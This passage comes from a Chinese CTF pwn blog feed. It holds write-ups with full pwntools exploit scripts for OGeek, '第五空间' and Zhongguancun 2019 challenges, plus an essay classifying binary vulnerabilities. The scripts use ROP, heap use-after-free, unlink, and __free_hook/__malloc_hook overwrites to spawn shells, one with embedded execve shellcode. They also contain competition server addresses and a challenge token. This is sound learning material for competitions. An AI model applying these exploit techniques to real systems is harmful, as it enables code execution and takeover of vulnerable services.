ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('47.112.137.238',13337) libc = ELF('./libc-2.23.so')P = ELF('./babyrop')main = 0x080487d0bss = 0x0804aa00#gdb.attach(p)p.send('\x00'*7+'\xff'+'\x00')p.recvuntil('Correct\n')payload = '\x11'*0xe7 payload+= p32(0xdeadbeef)payload+= p32(P.plt['write'])payload+= p32(main)payload+= p32(1)payload+= p32(P.got['write'])payload+= p32(4)p.send(payload)libcbase = u32(p.recv(4)) - libc.sym['write']log.success('libcbase = '+hex(libcbase))payload = '\x22'*231payload+= p32(0xdeadbeef)payload+= p32(libcbase+libc.sym['system'])payload+= p32(0xdeadbeef)payload+= p32(libcbase+libc.search('/bin/sh\x00').next())p.send(payload)if attach == 1: gdb.attach(p)p.interactive() OGeek-Bookmanager:程序漏洞百出，溢出，off-by-one，uaf。。。。。只要逻辑看懂，做出来只是时间问题，chunk的构造也不复杂。算是一道水题吧。。。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#coding:utf-8from pwn import *path = './bookmanager'debug = 1attach = 1#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('47.112.115.30',13337) libc = ELF('./libc-2.23.so')def new_chapter(name): p.recvuntil('choice:') p.sendline('1') p.recvuntil('name:') p.sendline(name)def new_section(chapter_name,section_name): p.recvuntil('choice:') p.sendline('2') p.recvuntil('into:') p.sendline(chapter_name) p.recvuntil('name:') p.sendline(section_name)def new_text(section_name,size,content): p.recvuntil('choice:') p.sendline('3') p.recvuntil('into:') p.sendline(section_name) p.recvuntil('write:') p.sendline(str(size)) p.recvuntil('Text:') p.send(content)def delete_text(section_name): p.recvuntil('choice:') p.sendline('6') p.recvuntil('name:') p.sendline(section_name)def delete_section(section_name): p.recvuntil('choice:') p.sendline('5') p.recvuntil('name:') p.sendline(section_name)def delete_chapter(chapter_name): p.recvuntil('choice:') p.sendline('4') p.recvuntil('name:') p.sendline(chapter_name)def show(): p.recvuntil('choice:') p.sendline('7')def update(section_name,content): p.recvuntil('choice:') p.sendline('8') p.recvuntil('Text):') p.sendline('Text') p.recvuntil('name:') p.sendline(section_name) p.recvuntil('New Text:') p.send(content)p.recvuntil('Name of the book you want to create: ')p.sendline('xiaoxiaorenwu')new_chapter('0')new_section('0','/bin/sh\x00')new_text('/bin/sh\x00',0x80,'\x11'*7+'\n')new_section('0','01')delete_text('/bin/sh\x00')new_text('01',0x80,'\x00')show()p.recvuntil('Text:')p.recvuntil('Text:')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f707708db78-0x7f7076cc9000)log.success('libcbase = '+hex(libcbase))payload = p64(0)*0x10 + p64(0x90) + p64(0x41) + p64(0x3130) + p64(0)*3 + p64(libcbase+libc.sym['__free_hook'])update('01',payload)update('01',p64(libcbase+libc.sym['system']))delete_section('/bin/sh\x00')if attach == 0: gdb.attach(p)p.interactive() OGeek-0 day manage:逻辑比较复杂，猜测是handle里的逻辑漏洞，当num等于0时，可产生uaf，进行leak和修改malloc_hook。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123#coding:utf-8from pwn import *path = '0day_manage'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new_L(data_size,data,note_size,note): p.recvuntil(' 0day\n') p.sendline('1') p.recvuntil('bug\n') p.sendline('1') p.recvuntil('size :') p.sendline(str(data_size)) p.recvuntil('data :') p.send(data) p.recvuntil('size :') p.sendline(str(note_size)) p.recvuntil('note :') p.send(note) p.recvuntil('offset :') p.sendline('0')def new_M(data_size,data,note_size,note,shell_size,shell): p.recvuntil(' 0day\n') p.sendline('1') p.recvuntil('bug\n') p.sendline('2') p.recvuntil('size :') p.sendline(str(data_size)) p.recvuntil('data :') p.send(data) p.recvuntil('size :') p.sendline(str(note_size)) p.recvuntil('note :') p.send(note) p.recvuntil('size :') p.sendline(str(shell_size)) p.recvuntil('shellcode :') p.send(shell)def new_Lo(data_size,data,note_size,note): p.recvuntil(' 0day\n') p.sendline('1') p.recvuntil('bug\n') p.sendline('3') p.recvuntil('size :') p.sendline(str(data_size)) p.recvuntil('data :') p.send(data) p.recvuntil('size :') p.sendline(str(note_size)) p.recvuntil('note :') p.send(note)def handle(my_type,num): p.recvuntil(' 0day\n') p.sendline('4') p.recvuntil('3. Logic\n') if my_type == 'L': p.sendline('1') if my_type == 'M': p.sendline('2') if my_type == 'Lo': p.sendline('3') p.recvuntil('handle in?') p.sendline(str(num))def show(my_type): p.recvuntil(' 0day\n') p.sendline('2') p.recvuntil('Logic\n') if my_type == 'L': p.sendline('1') if my_type == 'M': p.sendline('2')new_M(0x60,'a'*8,0x60,'b'*8,0x80,'c'*8)for i in range(8): handle('M',0)show('M')p.recvuntil('shellcode :')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f208aea0ca0-0x7f208aab5000)log.success('libcbase = '+hex(libcbase))one_gadget = [0x4f2c5,0x4f322,0x10a38c]new_Lo(0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23),0x68,'d'*8)payload = '\x00'*(0x13-0x8)+p64(libcbase+one_gadget[0])+p64(libcbase+libc.sym['realloc']+2)p.recvuntil(' 0day\n')p.sendline('1')p.recvuntil('bug\n')p.sendline('2')p.recvuntil('size :')p.sendline(str(0x60))p.recvuntil('data :')p.send('\x00'*0x60)p.recvuntil('size :')p.sendline(str(0x60))p.recvuntil('note :')p.send(payload)p.recvuntil('size :')p.sendline(str(0x10))if attach == 1: gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>ByteCTF</tag>
        <tag>OGeek</tag>
        <tag>SuCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019”第五空间“网络安全大赛]]></title>
    <url>%2F2019%2F08%2F28%2F2019%E2%80%9D%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[唉。。这个比赛。。。一言难尽。。。只有pwn和web，15个pwn，5个web。。。开始时满心欢喜，觉得很刺激。。。但后来发现题目出现各种问题：原题，Libc发的版本和远程服务器的不一样，高分题比低分题简单。。。 一共出了12个pwn。我看了四个，出了两个。。。也算有一点输出吧，有一题看了一下午。。。我jio得我没出的那两题还是出的不错的。。。有必要记录一下hhh 题目自取：谷歌硬盘 pwn8：开始以为是个菜单题。。后来发现只能show一次，而且只能看两个字节，edit三次，觉得事情并不简单。。。看了蛮久的，还是不会。。。后来看了blessing大佬的exp，如同醍醐灌顶，这题算是我之前在小心得2里提过的那一种最难找的漏洞。还是自己看为好hhhh。exp短小精悍。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#coding:utf-8from pwn import *path = './pwn10'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p=remote('111.33.164.6', 50010)def add(size,content): p.recvuntil("choice :") p.sendline('1') p.recvuntil('size :') p.sendline(str(size)) p.recvuntil('content') p.send(content)def delete(idx): p.recvuntil("choice : \n") p.sendline('4') p.recvuntil('index : \n') p.sendline(str(idx))def view(idx): p.recvuntil("choice : \n") p.sendline('2') p.recvuntil('index : \n') p.sendline(str(idx))def upgrade(idx,size,content): p.recvuntil("choice :") p.sendline('3') p.recvuntil('index :') p.sendline(str(idx)) p.recvuntil('size :') p.sendline(str(size)) p.recvuntil('content') p.send(content)P = ELF('./pwn10')p.recvuntil("choice :")p.sendline('1')p.recvuntil('size :')p.sendline(str(0))p.recvuntil("choice :")p.sendline('3')p.recvuntil('index :')p.sendline(str(0))p.recvuntil('size :')p.sendline(str(0))delete(0)p.recvuntil("choice :")p.sendline('1')p.recvuntil('size :')p.sendline(str(0))p.recvuntil("choice : \n")p.sendline('3')p.recvuntil('size : \n')p.sendline(str(8))p.recvuntil('content\n')p.send(p64(P.got['a64l']))view(0)lb1 = u16(p.recv(2))log.success('lb1 = '+hex(lb1))key = str(hex(lb1))key = key[2]payload = key+'390'payload = int(payload,16)p.recvuntil("choice : \n")p.sendline('3')p.recvuntil('index : \n')p.sendline('0')p.recvuntil('size : \n')p.sendline(str(2))p.recvuntil('content\n')p.send(p64(payload))p.recvuntil("choice :")p.sendline("/bin/sh\x00")p.interactive() pwn12：这题没出的原因是感觉其他因素太多，is_root我都不知道是干啥的。。。还有什么各种p1，p2，p3，canary的检查，一直迷在其中。。。想用unlink将is_root变为非零，并且觉得突破了size的限制，使size能上三位数才能用chunkoverlapping。。。忘了可以合并产生大chunk了。。。其实我觉得还是对unlink的条件不是很清楚，又理了一下： uaf，可以控制prev_size位加off-by-null，溢出，堆块重叠。。都可以用，其实本质还是溢出。。 思路就是先用off-by-null构造堆块重叠，然后unlink，将free_hook写为system。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#coding:utf-8from pwn import *def add(p, size): p.sendlineafter('Exit\n', str(1)) p.sendlineafter('?\n', str(size))def edit(p, idx, content): p.sendlineafter('Exit\n', str(2)) p.sendlineafter('?\n', str(idx)) p.sendafter(':\n', content) def show(p, idx): p.sendlineafter('Exit\n', str(3)) p.sendlineafter('?\n', str(idx))def delete(p, idx): p.sendlineafter('Exit\n', str(4)) p.sendlineafter('?\n', str(idx))def pwn(): #context.log_level = 'debug' #context.terminal = ['tmux', 'split', '-h'] context.terminal = ['terminator','-x','sh','-c'] elf = ELF('./pwn12') DEBUG = 1 if DEBUG == 1: p = process('./pwn12') #gdb.attach(p) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: p = remote('111.33.164.6', 50012) libc = ELF('./libc-2.19.so') #gdb.attach(p) p.recvuntil('what\'s your name?\n') p.sendline('sunichi') p.recvuntil('what\'s your info?\n') p.sendline('sunichi') add(p, 120) #0 add(p, 120) #1 delete(p, 0) add(p, 120) #0 show(p, 0) recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - 0x10 - libc.symbols['__malloc_hook'] - 88 log.success('libcbase = '+hex(libc.address)) delete(p, 1) delete(p, 0) add(p, 120) #0 add(p, 120) #1 add(p, 120) #2 add(p, 120) #3 add(p, 120) #4 add(p, 120) #5 add(p, 120) #6 add(p, 120) #7 delete(p, 3) delete(p, 4) delete(p, 5) payload = '\x00' * 120 edit(p, 2, payload) add(p, 120) #3 add(p, 120) #4 delete(p, 3) delete(p, 6) add(p, 120) #3 add(p, 120) #5 add(p, 120) #6 add(p, 120) #8 # 4 == 5 delete(p, 1) delete(p, 4) delete(p, 6) show(p, 5) recv = p.recvuntil('\n', drop=True) heap_addr = u64(recv.ljust(8, '\x00')) - 0x80 log.success('heap_addr = '+hex(heap_addr)) add(p, 120) #1 add(p, 120) #4 add(p, 120) #6 add(p, 120) #9 # 4 == 5 delete(p, 3) delete(p, 4) delete(p, 6) add(p, 120-0x10) add(p, 0x40) add(p, 0x30) payload = p64(0) + p64(0x41) + p64(0x602320 - 0x18) + p64(0x602320 - 0x10) edit(p, 4, payload) delete(p, 8) payload = p64(0x602320 - 0x18) + p64(0x602320 - 0x10) + p64(0) * 4 + p64(0x40) * 2 edit(p, 5, payload) delete(p, 6) edit(p, 0, '/bin/sh\x00') payload = p64(0x0000007800000001) + p64(libc.symbols['__free_hook']) + p64(0x0000007800000000) edit(p, 4, payload) payload = p64(libc.symbols['system']) edit(p, 3, payload) delete(p, 0) print hex(heap_addr) print hex(libc.address) p.interactive() p.close()if __name__ == '__main__': pwn() chunk overlapping的两种方法： 当时忘了第一种，迷在了第二种里。。。。。。。。。orz]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[杂物2]]></title>
    <url>%2F2019%2F08%2F18%2F%E5%B0%8F%E5%BF%83%E5%BE%972%2F</url>
    <content type="text"><![CDATA[前言：这算是写给自己看的一篇水文，呃，暑假也快过完了。。。各种大型比赛的题，来源奇怪的题也刷了不少了。。。但总感觉自己遇到了瓶颈。。。具体说也说不上来。。。虽然在跟着天枢打比赛，但是感觉个人能力没有在很高效地提升，这样下去以后很难独当一面，顶起战队的大梁。。。我静下心想了半天。。觉得自己遇到瓶颈的原因主要有以下几个方面： 太把自己局限在比赛里，无论是作为同龄人中翘楚的白神还是队里的研究生师傅，他们都有过丰富的挖洞和调试1day的经验，有过实战经验且知识面极广，知识面广了做CTF时思路才能广和灵活，而我却连挖洞都不会。。。基础的计算机学科的知识也不会多少，因为大二都没开始，专业课都几乎没上。。而且一点实战经验没有。。导致我做题时的思路比较狭隘和保守，只能在那一小块技巧里扣，没法放大了去观察。。。 基础不扎实，需要巩固基础，二进制的基础有啥呢，目前我接触到的，也就只有汇编，ELF文件结构，glibc内存管理。。这三个东西搞扎实了。。国内百分之70的pwn你可以随便秒了。。但是搞扎实还是蛮难的，glibc内存管理想吃透起码得两三周，还得复习，还要考虑不同的glibc版本。。。。耐下心来看书是一件很可贵的事情。。看书不像刚开始入门时刷题那样来的快，但却是想要进阶的必要条件，这是我的感触，可能每个人感觉不一样，包括一个ELF文件载入内存的过程具体是怎么样的，动态链接是怎么实现的，能不能伸手就来，malloc的chunk从哪来，free的chunk去哪了，能不能不调试就了然于胸？队长做技巧pwn都不用调试，直接写exp直接打，这也是为啥天枢一些技巧题总是拿一血，因为他太熟了，对每个chunk的来去都了然于胸。。。不像我还得写一步调试一步，看chunk构造的结构有没有错。。。大大降低了效率。 心态问题，没进天枢之前，我可以问问题的师傅很少，大部分都是自己想的，自己慢慢调，有时候一题想个几天。。但是进了天枢以后，感觉个人能力反而在下降。。有时候想个半小时没思路就去问队里师傅们。。。打比赛也因为想着反正我会的大佬们也肯定会，我就划划水就行了。。。锻炼的效果不是很好。。。其实比赛没必要这么紧张，完全可以把他当作复现，耐下心来看，静下心调。 我个人对题目的等级划分：初级题：洞不难找，考察简单的堆或者栈的利用技巧，可能会有一点小坑。 中级题： 中级技巧题：题目逻辑不复杂，找洞难度一般，但是利用链非常长，会综合很多已出现的利用技巧，有坑（例如比较难找的gagdets。） 中级分析题：题目逻辑复杂，洞较难找，利用大多是利用程序本身自带的功能而非平时所见到的技巧，需要把程序吃透。 高级题/压轴题： 高级技巧题：市面上还没出现的新的技巧，一般市面上常见的技巧第一次出现都是高级压轴题，第二次就是初级和中级题了，例如：2019Hitcon-house of orange。 高级分析题：国外貌似基本都是这种题，类似于数学里的新定义运算，让你去学习一个新东西，然后熟悉他，了解他，最后pwn他，让你在做题时能学到知识。模拟内存管理，模拟cpu。。都属于这一种 以上为简单的划分，不可能精确到每道题按号入座。。。。 漏洞整理：之前和队长交流，他说常规的二进制漏洞就这么多，实在找不到洞就一个一个对。。所以我在这里把见过的洞都整理一下。 溢出类漏洞：溢出类漏洞是我们接触pwn最先接触到的漏洞，相信大家都是从基础栈溢出开始入门pwn的，虽然溢出漏洞是最常见的漏洞，但我个人感觉其实它也是最深邃的一类漏洞，很多难题都是最终都是溢出的漏洞，只是被复杂的程序逻辑隐藏而不易发现，或者需要很复杂的构造和触发条件。 栈溢出：形式较多，但本质：对一个栈变量的输入可以修改另外一个栈变量（或者函数返回地址和rbp）,进而产生因栈变量改变而产生的其他漏洞。比如函数指针列表的index存在栈上，栈溢出改index再进行数组下标溢出等。 堆溢出：形式较多，但本质：对一个堆块的输入可以修改另外一个堆块的关键位置（size位，fd位，bk位，nextfd位，nextbk位，prev_size位算一半吧。。）或者content，当然，如果本身堆块是个结构体的话，也可能是溢出到同一个堆块的其他重要变量了。。总之情况很多。 整数溢出/字符溢出：无论是字符溢出还是整数溢出，我觉得我们的本质的目的是想让一个数/字符，不断增大，不断增大，不断增大，然后突然变得极小，然后再对这个本应是很大的数所操纵的内存进行大数据填充，形成溢出，常见的比如：chunk的size位整数溢出，还有一种情况是利用signed int向unsigned int（size_t）强转时产生的：例如： 1234int size;scanf('%d',&amp;size);ptr = malloc(size+8);read(0,ptr,size); 如果我们输入size为负数时就会发生堆溢出。因为malloc(size_t a1)； read(FILE fd，void p，size_t a1)。size_t为unsigned int型，所以强转时会产生漏洞。 对数组进行操作时因为下标检查不严造成OOB(Out Of Bound) 堆块指针列表 函数指针列表 堆块size列表 结构体列表 题目自定义列表 空间复用： 多线程时见过两次，国外题见过一次。常见的情景就是程序内存（或者是自定义的某个东西）空间不足了，所以之后的内存要和之前已经分配出去的内存共用。 逻辑类漏洞：条件竞争： 一般出现在多线程和中，典型例子：多个线程竞争改一个全局变量。 运算符优先级：状态检查： 对一块内存进行使用时，是否进行了状态检查，（不要忽略程序自定义的状态检查。）各种的UAF都可以分到这一类。 最难的一类漏洞：程序自身功能设计不严密导致的逻辑漏洞。。。这个很难描述，但是找的难度真的很大，一般扫了多遍题目都没有找到奇怪的地方，很有可能就是这一类。。。一般程序出现某个地方显得很诡异（就是那种直接看似乎没啥毛病，但是和其他功能配合起来就会产生逻辑漏洞。。。）。。或是一个有点陌生的函数。。 需要很深的理解程序。。但是一般利用起来不难，exp短而精。。。。 特殊情况：极大： 分配的size大小无检测，可以对topchunk进行操作，也可以整数溢出。 极小： 分配的size大小无检测，可以分配0字节，进行泄露，还可以利用0x0，0x8，0x10，0x18都分配0x20大小的chunk这一点。 内存未初始化： 栈内存未初始化，几个函数共用一块栈时可能会一个溢出另一个或者留下脏数据，可用来泄露或者攻击。 堆内存未初始化，几个结构体共用一个chunk时前一个可能会留下脏数据(比如指针啥的)给后一个，可用来泄露或者攻击。 未检查函数返回值： malloc，成功时返回chunk指针，失败时返回0，若不检查可能会和后面对指针进行的其他操作配合导致溢出。 read，成功时返回读取的字节数，读取失败时返回-1，且内容会一直残留在输入缓冲区，若不检查可能会导致溢出。 库函数自身不严谨：printf__printf_chkscanfabssnprintfstrchr…… 其他（算是特点，不算是漏洞了其实）：类编辑操作次数不限：常见的有堆题的upgrade/edit功能，有的逻辑复杂的程序会自定义类编辑操作，如果次数不限的话，就很好用，哪怕一次只能对一个字节进行操作，1 * 无限 = 无限，有时候也可以用这个特点来爆破。 无干扰字符：可以输入空，也就是碰到回车直接返回不会补\x00或者\n干扰content，这对于UAF来说是一个很方便的点。 …… 一个表，方便查找数据类型： 2015/06/09 Visual C++ 32 位和 64 位编译器可识别本文后面的表中的类型。 int (unsigned int) int8 (unsigned int8) int16 (unsigned int16) int32 (unsigned int32) int64 (unsigned int64) short (unsigned short) long (unsigned long) long long (unsigned long long) 如果其名称以两个下划线 (__) 开始，则数据类型是非标准的。 下表中指定的范围均包含起始值和结束值。 类型名称 字节 其他名称 值的范围 int 4 signed –2,147,483,648 到 2,147,483,647 unsigned int 4 unsigned 0 到 4,294,967,295 __int8 1 char –128 到 127 unsigned __int8 1 unsigned char 0 到 255 __int16 2 short、short int、signed short int –32,768 到 32,767 unsigned __int16 2 unsigned short、unsigned short int 0 到 65,535 __int32 4 signed、signed int、int –2,147,483,648 到 2,147,483,647 unsigned __int32 4 unsigned、unsigned int 0 到 4,294,967,295 __int64 8 long long、signed long long –9,223,372,036,854,775,808 到 9,223,372,036,854,775,807 unsigned __int64 8 unsigned long long 0 到 18,446,744,073,709,551,615 bool 1 无 false 或 true char 1 无 -128 到 127（默认）0 到 255（当使用 /J) 编译时） signed char 1 无 –128 到 127 unsigned char 1 无 0 到 255 short 2 short int、signed short int –32,768 到 32,767 unsigned short 2 unsigned short int 0 到 65,535 long 4 long int、signed long int –2,147,483,648 到 2,147,483,647 unsigned long 4 unsigned long int 0 到 4,294,967,295 long long 8 无（与 __int64 等效） –9,223,372,036,854,775,808 到 9,223,372,036,854,775,807 unsigned long long 8 无（与无符号的 __int64 等效） 0 到 18,446,744,073,709,551,615 enum varies 无 请参阅本文后面的备注。 float 4 无 3.4E +/- 38（7 位数） double 8 无 1.7E +/- 308（15 位数） long double 与 double 相同 无 与 double 相同 wchar_t 2 __wchar_t 0 到 65,535 根据使用方式，__wchar_t 的变量指定宽字符类型或多字节字符类型。 在字符或字符串常量前使用 L 前缀以指定宽字符类型常量。 signed 和 unsigned 是可用于任何整型（bool 除外）的修饰符。 请注意，对于重载和模板等机制而言，char、signed char 和 unsigned char 是三种不同的类型。 int 和 unsigned int 类型具有四个字节的大小。 但是，由于语言标准允许可移植代码特定于实现，因此该代码不应依赖于 int 的大小。 Visual Studio 中的 C/C++ 还支持按大小分类的整型。 有关更多信息，请参见int8、int16、int32、int64)和整数限制)。 有关每个类型的大小限制的详细信息，请参阅基本类型 (C++))。 枚举类型的范围因语言上下文和指定的编译器标志而异。 有关更多信息，请参见C 枚举声明)和C++ 枚举声明)。 参考C++ 关键字) 基本类型 (C++)) 一点小发现系统调用里存在syscall的地址，且貌似都是func_addr+0xe。。让我想起unprintable里那个用puts的残留栈数据加partial overwrite来产生syscall的技巧。。。 看图： ps：alarm函数在alarm+5的地方就是syscall了，比read/write/open都要近一点。]]></content>
      <categories>
        <category>PWN基础</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019中关村信息安全专项赛]]></title>
    <url>%2F2019%2F08%2F16%2F2019%E4%B8%AD%E5%85%B3%E6%9D%91%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%93%E9%A1%B9%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[one_string:一道静态编译的32位堆题，被队长直接秒了一血orz，我等渣渣只能跟在屁股后面打打本地艰难生存这样子。。。。 漏洞和利用思路：漏洞点在于strlen造成的溢出。 逆向可能有点点难度。。。确定好各个函数，然后思路就很明了了，所有的保护都没开，还有chunklist，unlink为第一选择技巧，成功以后可以任意写，把一个chunk_ptr改为mmap地址，接着往mmap地址处注入shellcode，再把一个chunk_ptr改为malloc_hook，然后把malloc_hook改为mmap地址即可。远程有点坑，我当时交互似乎出现了问题，没有接收到他输出的字符串信息。。。。 自己的exp，本地打通：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#coding:utf-8from pwn import *path = './pwn'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('df0a72047d6c.gamectf.com',10001)def new(size,content): #raw_input() sleep(0.1) p.sendline('1') #raw_input() sleep(0.1) p.sendline(str(size)) #raw_input() sleep(0.1) p.send(content)def delete(index): sleep(0.1) p.sendline('2') sleep(0.1) p.sendline(str(index))def upgrade(index,content): sleep(0.1) #raw_input() p.sendline('3') sleep(0.1) #raw_input() p.sendline(str(index)) #raw_input() sleep(0.1) p.send(content)#p.recvuntil('input:\n')new(0x30,'\x01'*0x30) #0new(0x10,'\x01'*0x10) #1 0x100new(0x10,'\x02'*0x10) #2 0x200new(0x14,p32(0x03030303)+p32(0x18)+p32(0x080eba40+0xc-0xc)+p32(0x080eba40+0xc-8)+'\x03'*0x4) #3new(0x58,p32(0x18)+'\x04'*0x54) #4new(0x10,'\x05'*0x10) #5#gdb.attach(p)upgrade(3,p32(0x03030303)+p32(0x03030303)+p32(0x080eba40+0xc-0xc)+p32(0x080eba40+0xc-8)+'\x03'*0x4)upgrade(3,p32(0x03030303)+p32(0x18)+p32(0x080eba40+0xc-0xc)+p32(0x080eba40+0xc-8)+p32(0x10)+'\x60')delete(4)shellcode ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"upgrade(3,p32(0x080eb110)+'\n')upgrade(0,shellcode+'\n')upgrade(3,p32(0x080EA4D8))upgrade(0,p32(0x080eb110)+'\n')#gdb.attach(p)new(0x10,'\n')if attach == 1: gdb.attach(p)p.interactive() 队长exp，远程:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *import base64context.log_level = 'debug'context.terminal = ['tmux', 'split', '-h']def add(p, size, content): payload = (str(1) + '\n') payload += (str(size) + '\n') if size == len(content): payload += (content) else: payload += (content + '\n') return payloaddef delete(p, idx): payload = (str(2) + '\n') payload += (str(idx) + '\n') return payloaddef edit(p, idx, content): payload = (str(3) + '\n') payload += (str(idx) + '\n') payload += (content) return payloaddef pwn(): DEBUG = 0 if DEBUG == 1: p = process('./pwn') else: p = remote('df0a72047d6c.gamectf.com', 10001) if DEBUG == 1: gdb.attach(p) p.sendlineafter('token:\n', 'icq16d3378b212336b61cfd024813f31') malloc_hook = 0x80EA4D8 p.recvuntil('So, please give me a base64 strings:\n') b64string = '' b64string += add(p, 0x100-4, 'sunichi') b64string += add(p, 0x100-4, 'sunichi') for i in range(10): b64string += add(p, 0x2c, 'sunichi') b64string += add(p, 0x30, 'sunichi') b64string += edit(p, 0, 'a' * (0x100-4)) payload = 'a' * (0x100-4) + '\x31\x01' b64string += edit(p, 0, payload) b64string += delete(p, 1) b64string += add(p, 0x100-4, 'sunichi') b64string += add(p, 0x2c, 'sunichi') b64string += delete(p, 2) b64string += delete(p, 3) b64string += delete(p, 13) b64string += add(p, 0x2c, p32(0x80eba30-4)) b64string += add(p, 0x2c, 'sunichi') b64string += add(p, 0x2c, 'sunichi') b64string += add(p, 0x2c, p32(0xdeadbeef) * 3 + p32(malloc_hook) + p32(0x080eb800)) shellcode = asm(shellcraft.i386.linux.sh()) b64string += edit(p, 1, shellcode + '\n') b64string += edit(p, 0, p32(0x080eb800) + '\n') b64string += add(p, 0x80, 'cat /flag') p.sendline(base64.b64encode(b64string)) #flag&#123;d56e5fc7d384ee7e4661178d17ca25b9&#125; p.interactive() p.close()if __name__ == '__main__': pwn() two_string:漏洞和思路分析：漏洞点在于再拼接十个字符串时，未检查size的大小，可以导致整数溢出，进而导致堆溢出。需要耐下心来慢慢构造chunk。 还有一个鬼畜的点在于index的检查有问题，但是没有卵用，泄露不了程序基址的话没法利用。 远程Libc版本为2.24，找Libc可以利用pwntools： 12&gt; `libcdb.search_by_md5('cfcef452ef69ea2dd73d6f55d7607c2b')`&gt; 队长exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149from pwn import *import base64context.log_level = 'debug'context.terminal = ['tmux', 'split', '-h']def add(p, size, content): p.sendlineafter('&gt;&gt;&gt; ', '1') p.sendlineafter('Please enter the size of string : ', str(size)) if size == len(content): p.sendafter('Please enter the string : ', content) else: p.sendlineafter('Please enter the string : ', content)def show(p, idx): p.sendlineafter('&gt;&gt;&gt; ', '2') p.sendlineafter('Please input index : ', str(idx))def delete(p, idx): p.sendlineafter('&gt;&gt;&gt; ', '3') p.sendlineafter('Please input index : ', str(idx))def merges(p, payload): p.sendlineafter('&gt;&gt;&gt; ', '5') p.sendlineafter('Please enter a sequence of strings to be merged : ', payload) def pwn(): DEBUG = 0 lib_version = 24 if DEBUG == 1 and lib_version == 23: p = process('./pwn') libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so') elif DEBUG == 1 and lib_version == 24: p = process('./pwn', env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) libc = ELF('./libc.so.6') else: p = remote('a32f094e35d7.gamectf.com', 20001) libc = ELF('./libc.so.6') if DEBUG == 1: gdb.attach(p) # leak heap addr add(p, 0x10, 'sunichi') add(p, 0x10, 'sunichi') delete(p, 0) delete(p, 1) p.sendlineafter('&gt;&gt;&gt; ', '1') p.sendlineafter('Please enter the size of string : ', str(0)) #0 show(p, 0) p.recvuntil('Notes are : ') recv = p.recv(6) + '\x00\x00' heap_base = u64(recv) - 0x40 #leak libc base add(p, 0x100, 'sunichi') #1 add(p, 0x40, 'sunichi') #2 delete(p, 1) add(p, 0x10, 'sunichi') #1 p.sendlineafter('&gt;&gt;&gt; ', '1') p.sendlineafter('Please enter the size of string : ', str(0)) #3 show(p, 3) p.recvuntil('Notes are : ') recv = p.recv(6) + '\x00\x00' if DEBUG == 1 and lib_version == 23: libc.address = u64(recv) - (0x00007f2cc07cab78 - 0x00007f2cc0406000) else: libc.address = u64(recv) - (0x00007fd07662db58 - 0x00007fd07626c000) add(p, 0x800, '') #4 add(p, 0x800, 'a' * 0x428) #5 merges(p, '4' + ' 4' * 7) #6 0x4000 merges(p, '5' + ' 4' * 7) #7 delete(p, 4) delete(p, 5) merges(p, '6' + ' 6' * 7) #4 0x20000 merges(p, '7' + ' 6' * 7) #5 delete(p, 6) delete(p, 7) merges(p, 